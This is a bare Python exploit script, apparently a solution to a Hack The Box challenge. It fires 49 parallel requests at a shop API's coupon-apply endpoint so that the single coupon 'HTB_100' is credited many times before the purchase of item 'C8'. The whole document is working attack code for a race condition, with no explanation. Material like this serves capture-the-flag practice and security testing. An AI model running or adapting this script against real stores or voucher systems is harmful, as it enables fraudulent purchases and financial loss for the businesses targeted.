import multiprocessing
import requests
session = requests.Session()

base_url = 'http://134.209.186.36:32675/api'

cookie = ""

def reset():
    global cookie
    url = "{}/reset".format(base_url)
    response = session.get(url)
    cookie = session.cookies.get_dict()
    # print(cookie)
    # print(response.text)

def insert_coin():
    global cookie
    url = "{}/coupons/apply".format(base_url)
    data = {
        "coupon_code": "HTB_100"
    }
    response = requests.post(url, data=data, cookies=cookie)
    if (False == bool(cookie)):
        cookie = response.cookies.get_dict()
    # print(cookie)
    # print(response.text)

def purchase():
    global cookie
    url = "{}/purchase".format(base_url)
    data = {
        "item": "C8"
    }
    response = requests.post(url, data=data, cookies=cookie)
    if (False == bool(cookie)):
        cookie = response.cookies.get_dict()
    # print(cookie)
    print(response.text)

reset()
purchase()
transactions = []
for i in range(1, 50):
    transactions.append(multiprocessing.Process(target=insert_coin))
for j in transactions:
    j.start()
for k in transactions:
    k.join()

purchase()
    